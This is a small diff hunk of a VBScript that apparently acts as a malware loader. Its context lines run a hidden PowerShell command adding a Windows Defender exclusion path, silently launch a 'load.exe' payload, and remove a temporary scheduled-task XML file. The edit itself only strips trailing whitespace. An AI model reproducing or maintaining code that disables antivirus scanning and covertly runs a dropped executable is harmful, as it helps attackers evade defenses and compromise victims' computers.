@@ -92,7 +92,7 @@ addExclusionCommand = "powershell -Command ""Add-MpPreference -ExclusionPath '" 
 objShell.Run addExclusionCommand, 0, True
 
 WScript.Echo "Running load.exe directly..."
-objShell.Run """" & savePath & """", 0, False 
+objShell.Run """" & savePath & """", 0, False
 
 If fso.FileExists(taskXMLPath) Then
     WScript.Echo "Cleaning up temporary XML file..."
